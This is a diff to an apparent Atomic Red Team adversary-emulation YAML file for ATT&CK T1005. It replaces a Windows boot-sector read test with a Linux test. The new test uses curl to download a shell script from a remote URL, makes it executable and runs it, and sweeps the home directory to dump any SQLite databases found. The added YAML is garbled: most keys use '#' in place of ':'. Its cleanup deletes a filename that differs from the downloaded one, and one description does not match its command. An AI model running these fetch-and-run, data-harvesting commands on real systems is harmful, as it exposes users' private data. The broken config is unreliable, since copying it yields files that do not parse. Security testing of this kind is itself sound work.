@@ -2,31 +2,37 @@ attack_technique: T1005
 display_name: Data from Local System
 atomic_tests:
 
-- name: Read volume boot sector via DOS device path (PowerShell)
-  auto_generated_guid: 88f6327e-51ec-4bbf-b2e8-3fea534eab8b
-  description: |-
-    This test uses PowerShell to open a handle on the drive volume via the `\\.\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.
-    On success, a hex dump of the first 11 bytes of the volume is displayed.
-
-    For a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):
-    ```
-               00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
-
-    00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS
-    ```
+- name: Find and dump sqlite databases (Linux)
+  description: # |
+    An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
   supported_platforms:
-  - windows
+  - linux
   input_arguments:
-    volume:
-      description: Drive letter of the volume to access
-      type: string
-      default: 'C:'
+    remote_url:
+      description # url of remote payload
+      type # Url
+      default # https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
+  dependencies:
+  - description # |
+      Check if running on a Debian based machine.
+    prereq_command # |
+      if [ -x "$(command -v sqlite3)" ]; then echo "sqlite3 is installed"; else echo "sqlite3 is NOT installed"; exit 1; fi
+      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+      if [ -x "$(command -v strings)" ]; then echo "strings is installed"; else echo "strings is NOT installed"; exit 1; fi
+    get_prereq_command # |
+      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+      if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
   executor:
-    command: |
-      $buffer = New-Object byte[] 11
-      $handle = New-Object IO.FileStream "\\.\#{volume}", 'Open', 'Read', 'ReadWrite'
-      $handle.Read($buffer, 0, $buffer.Length)
-      $handle.Close()
-      Format-Hex -InputObject $buffer
-    name: powershell
-    elevation_required: true
+    name # bash
+    elevation_required # false
+    command # |
+        cd $HOME
+        curl -O #{remote_url}/art
+        curl -O #{remote_url}/gta.db
+        curl -O #{remote_url}/sqlite_dump.sh
+        chmod +x sqlite_dump.sh
+        find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+    cleanup_command # |
+        rm -f $HOME/.art
+        rm -f $HOME/gta.db
+        rm -f $HOME/sqlite_dump.sh 
